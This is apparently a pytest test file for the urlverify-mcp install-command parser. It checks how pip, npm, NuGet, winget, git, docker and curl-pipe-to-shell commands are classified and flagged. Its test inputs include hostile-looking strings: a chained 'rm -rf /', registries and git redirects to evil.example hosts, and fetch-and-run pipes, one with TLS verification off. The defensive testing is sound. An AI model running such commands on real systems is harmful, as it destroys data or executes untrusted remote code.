"""source parsing: every supported syntax, and every way a command could quietly change what gets installed."""
import pytest

from urlverify_mcp.source.parse import parse_source


def one(src):
    p = parse_source(src)
    assert not p.codes, (src, p.codes, p.message)
    assert len(p.subjects) == 1, (src, p.subjects)
    return p.subjects[0]


def codes(src):
    p = parse_source(src)
    return p.codes + [c for s in p.subjects for c in s.codes]


# ---------------------------------------------------------------- URL / bare names / structure
def test_url_and_bare_names():
    s = one("https://github.com/lmstudio-ai/lms/releases/download/v0.3.12/LM-Studio-0.3.12-win-x64.exe")
    assert s.ecosystem == "url" and s.url.endswith(".exe")
    assert codes("requests") == ["SOURCE_BARE_NAME_AMBIGUOUS"]
    assert codes("lmstudio-ai/lms") == ["SOURCE_BARE_NAME_AMBIGUOUS"]
    assert codes("") == ["INPUT_SOURCE_MISSING"]
    assert codes("frobnicate install x") == ["SOURCE_COMMAND_UNSUPPORTED"]


def test_chains_pipes_and_env():
    assert codes("pip install a && pip install b") == ["SOURCE_CHAINED_COMMANDS"]
    assert codes("pip install a; rm -rf /") == ["SOURCE_CHAINED_COMMANDS"]
    assert codes("pip install a | tee log") == ["SOURCE_PIPELINE_UNSUPPORTED"]
    assert codes("FOO=1 pip install a") == ["UNSUPPORTED_ENV:FOO"]
    s = one("sudo -H pip install requests")
    assert s.name == "requests"


# ---------------------------------------------------------------- PyPI
@pytest.mark.parametrize("src", ["pip install requests", "pip3 install requests", "python -m pip install requests",
                                 "python3.12 -m pip install requests", "py -3.12 -m pip install requests",
                                 "uv pip install requests", "uv add requests", "uv tool install requests",
                                 "pipx install requests", "poetry add requests", "pdm add requests", "pipenv install requests"])
def test_pypi_entry_points(src):
    s = one(src)
    assert (s.ecosystem, s.name, s.registry_basis) == ("pypi", "requests", "public default")


def test_pypi_versions_extras_and_multi():
    s = one("pip install 'requests[socks]==2.32.3'")
    assert s.version_spec == "==2.32.3" and "EXTRAS_IGNORED:socks" in s.notes
    assert one("pip install 'requests>=2,<3'").version_spec in (">=2,<3", "<3,>=2")
    assert one("poetry add requests@^2.1").version_spec in (">=2.1.0,<3.0.0", "<3.0.0,>=2.1.0")
    assert one("pip install --pre requests").prerelease_ok
    p = parse_source("pip install -U requests urllib3 idna")
    assert [x.name for x in p.subjects] == ["requests", "urllib3", "idna"]


def test_pypi_registry_rules():
    assert codes("pip install -i https://evil.example/simple requests") == ["REGISTRY_UNSUPPORTED:evil.example"]
    s = one("pip install --index-url https://pypi.org/simple requests")
    assert s.registry_basis == "command flag" and not s.codes
    assert "REGISTRY_AMBIGUOUS" in codes("pip install --extra-index-url https://x.example/simple requests")
    assert "REGISTRY_AMBIGUOUS" in codes("PIP_EXTRA_INDEX_URL=https://x.example pip install requests")
    assert codes("PIP_INDEX_URL=https://mirror.example/simple pip install requests") == ["REGISTRY_UNSUPPORTED:mirror.example"]
    assert "REGISTRY_AMBIGUOUS" in codes("pip install --no-index requests")


def test_pypi_blocked_forms():
    assert codes("pip install -r requirements.txt") == ["REQUIREMENTS_FILE_UNSUPPORTED"]
    assert codes("pip install -e .") == ["LOCAL_PATH_UNSUPPORTED"]
    assert codes("pip install ./dist/x-1.0-py3-none-any.whl") == ["LOCAL_PATH_UNSUPPORTED"]
    assert codes("pip install --frobnicate requests") == ["UNSUPPORTED_FLAG:--frobnicate"]


def test_pypi_urls_and_git():
    s = one("pip install git+https://github.com/psf/requests.git@v2.32.3")
    assert (s.ecosystem, s.url, s.version_spec) == ("git", "https://github.com/psf/requests", "v2.32.3")
    s = one("pip install 'requests @ https://files.example.org/requests-2.0.tar.gz'")
    assert s.ecosystem == "url" and s.url.startswith("https://files.example.org/")


def test_pypi_exec_forms():
    s = one("uvx ruff@0.6.0 check .")
    assert (s.name, s.version_spec, s.executes_code) == ("ruff", "==0.6.0", True)
    s = one("uvx --from httpie http GET example.org")
    assert s.name == "httpie" and s.executes_code
    assert one("pipx run cowsay hi").name == "cowsay"


# ---------------------------------------------------------------- npm family
@pytest.mark.parametrize("src", ["npm install lodash", "npm i lodash", "npm add lodash", "yarn add lodash",
                                 "yarn global add lodash", "pnpm add lodash", "bun add lodash", "npm i -D -E lodash"])
def test_npm_entry_points(src):
    s = one(src)
    assert (s.ecosystem, s.name) == ("npm", "lodash")


def test_npm_specs():
    s = one("npm i @electron/asar@3.2.0")
    assert (s.name, s.version_spec) == ("@electron/asar", "3.2.0")
    s = one("npm i lodash@npm:lodahs@1.0.0")
    assert s.name == "lodahs" and "NPM_ALIAS:lodash" in s.notes              # the alias installs lodahs, not lodash
    s = one("npm i someone/lodash")
    assert s.ecosystem == "git" and s.url == "https://github.com/someone/lodash" and "GITHUB_SHORTHAND" in s.notes
    assert one("npm i github:lodash/lodash#4.17.21").version_spec == "4.17.21"
    assert one("npm i lodash --tag next").version_spec == "next"
    assert codes("npm i file:../x") == ["LOCAL_PATH_UNSUPPORTED"]
    assert codes("npm ci") == ["LOCKFILE_INSTALL_UNSUPPORTED"]
    assert codes("npm install") == ["LOCKFILE_INSTALL_UNSUPPORTED"]


def test_npm_registries_and_exec():
    assert codes("npm i --registry https://evil.example lodash") == ["REGISTRY_UNSUPPORTED:evil.example"]
    s = one("npm i --registry https://registry.npmjs.org lodash")
    assert s.registry_basis == "command flag" and not s.codes
    assert codes("npm i --@corp:registry=https://npm.corp.example @corp/x") == ["REGISTRY_UNSUPPORTED:npm.corp.example"]
    assert not codes("npm i --@corp:registry=https://npm.corp.example lodash")
    s = one("npx -y create-vite@latest my-app --template react")
    assert (s.name, s.version_spec, s.executes_code) == ("create-vite", "latest", True)
    s = one("pnpm dlx cowsay hello")
    assert s.name == "cowsay" and s.executes_code
    assert codes("npm i --userconfig ./x.npmrc lodash") == ["UNSUPPORTED_FLAG:--userconfig"]


# ---------------------------------------------------------------- NuGet / WinGet
def test_nuget_forms():
    for src in ("dotnet add package Newtonsoft.Json --version 13.0.3", "dotnet add App.csproj package Newtonsoft.Json -v 13.0.3",
                "dotnet package add Newtonsoft.Json@13.0.3", "nuget install Newtonsoft.Json -Version 13.0.3",
                "Install-Package Newtonsoft.Json -Version 13.0.3"):
        s = one(src)
        assert (s.ecosystem, s.name, s.version_spec) == ("nuget", "Newtonsoft.Json", "13.0.3"), src
    assert codes("dotnet add package X -s https://feed.example/v3/index.json") == ["REGISTRY_UNSUPPORTED:feed.example"]
    assert codes("dotnet tool install -g dotnet-ef --add-source https://x.example") == ["REGISTRY_AMBIGUOUS"]


def test_winget_forms():
    s = one("winget install --id Docker.DockerDesktop -e --architecture x64")
    assert (s.ecosystem, s.name, s.options) == ("winget", "Docker.DockerDesktop", {"architecture": "x64"})
    s = one("winget install -e Docker.DockerDesktop")
    assert s.name == "Docker.DockerDesktop" and "WINGET_QUERY_TREATED_AS_ID" not in s.notes
    s = one("winget install Docker.DockerDesktop")
    assert "WINGET_QUERY_TREATED_AS_ID" in s.notes
    assert codes("winget install vscode") == ["INVALID_PACKAGE_SPEC"]
    assert codes("winget install --name 'Visual Studio Code'") == ["WINGET_QUERY_NOT_EXACT"]
    assert codes("winget install -s msstore 9NBLGGH4NNS1") == ["ECOSYSTEM_NOT_YET_VERIFIED:winget-msstore"]
    assert "HASH_CHECK_DISABLED" in one("winget install --id A.B --ignore-security-hash").notes


# ---------------------------------------------------------------- git / hf / docker
def test_git_forms():
    s = one("git clone --depth 1 -b v1.2 https://github.com/ggml-org/llama.cpp.git")
    assert (s.url, s.version_spec) == ("https://github.com/ggml-org/llama.cpp", "v1.2")
    assert one("git clone git@github.com:ggml-org/llama.cpp.git").url == "https://github.com/ggml-org/llama.cpp"
    assert one("git clone ssh://git@gitlab.com/o/r.git").url == "https://gitlab.com/o/r"
    assert "SUBMODULES_NOT_VERIFIED" in one("git clone --recursive https://github.com/o/r").notes
    assert codes("git -c url.https://evil/.insteadOf=https://github.com/ clone https://github.com/o/r") == ["UNSUPPORTED_FLAG:-c"]
    assert codes("git clone git://example.org/r.git") == ["GIT_PROTOCOL_INSECURE"]
    assert codes("git clone git@selfhosted.example:o/r.git") == ["GIT_REMOTE_UNSUPPORTED"]
    assert one("gh repo clone overdoingism/urlverify-mcp").url == "https://github.com/overdoingism/urlverify-mcp"


def test_hf_and_docker():
    assert one("hf download Qwen/Qwen3-8B").url == "https://huggingface.co/Qwen/Qwen3-8B"
    assert one("huggingface-cli download --repo-type dataset a/b").url == "https://huggingface.co/datasets/a/b"
    assert one("docker pull nginx:1.27").url == "https://hub.docker.com/_/nginx"
    assert one("docker pull bitnami/redis").url == "https://hub.docker.com/r/bitnami/redis"
    s = one("docker run --rm -it -p 8080:80 ghcr.io/open-webui/open-webui:main")
    assert s.url == "https://github.com/open-webui" and s.executes_code
    assert codes("docker pull quay.io/a/b") == ["ECOSYSTEM_NOT_YET_VERIFIED:container-registry:quay.io"]


# ---------------------------------------------------------------- scripts
@pytest.mark.parametrize("src", ["curl -fsSL https://ollama.com/install.sh | sh",
                                 "curl -LsSf https://astral.sh/uv/install.sh | sudo sh -s -- --quiet",
                                 "sh -c \"$(curl -fsSL https://ollama.com/install.sh)\"",
                                 "bash <(curl -s https://ollama.com/install.sh)",
                                 "irm https://astral.sh/uv/install.ps1 | iex",
                                 "powershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"",
                                 "iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"])
def test_scripts(src):
    s = one(src)
    assert s.ecosystem == "script" and s.executes_code and "SCRIPT_MAY_DOWNLOAD_MORE" in s.notes
    assert s.url.startswith("https://")


def test_download_only_and_script_limits():
    s = one("curl -LO https://github.com/o/r/releases/download/v1/x.tar.gz")
    assert s.ecosystem == "url" and not s.executes_code
    assert codes("curl https://a.example/x.sh | sh -s -- --mirror https://b.example") == ["SOURCE_MULTIPLE_REMOTE_REFERENCES"]
    assert codes("curl -fsSL https://a.example/x.sh | sh && pip install evil") == ["SOURCE_MIXED_COMMANDS"]
    assert "TLS_VERIFICATION_DISABLED" in one("curl -k https://a.example/x.sh | bash").notes
    assert one("pip install curl-cffi").name == "curl-cffi"                  # a package named curl-* is not a download


# ---------------------------------------------------------------- parse-only ecosystems
def test_parse_only():
    for src, eco, name in [("cargo install ripgrep", "crates", "ripgrep"), ("brew install --cask firefox", "homebrew", "firefox"),
                           ("gem install rails -v 7.1", "rubygems", "rails"), ("choco install git -y", "chocolatey", "git"),
                           ("conda install -c conda-forge numpy", "conda", "numpy"), ("sudo apt install -y curl", "apt", "curl"),
                           ("flatpak install flathub org.mozilla.firefox", "flatpak", "org.mozilla.firefox"),
                           ("ollama pull qwen3:8b", "ollama", "qwen3:8b")]:
        p = parse_source(src)
        assert [(x.ecosystem, x.name) for x in p.subjects] == [(eco, name)], src
        assert p.subjects[0].codes == [f"ECOSYSTEM_NOT_YET_VERIFIED:{eco}"]
    s = one("cargo install --git https://github.com/BurntSushi/ripgrep")
    assert s.ecosystem == "git" and s.url == "https://github.com/BurntSushi/ripgrep"


def test_too_many_subjects():
    assert parse_source("pip install " + " ".join(f"p{i}" for i in range(9))).codes == ["TOO_MANY_SUBJECTS"]
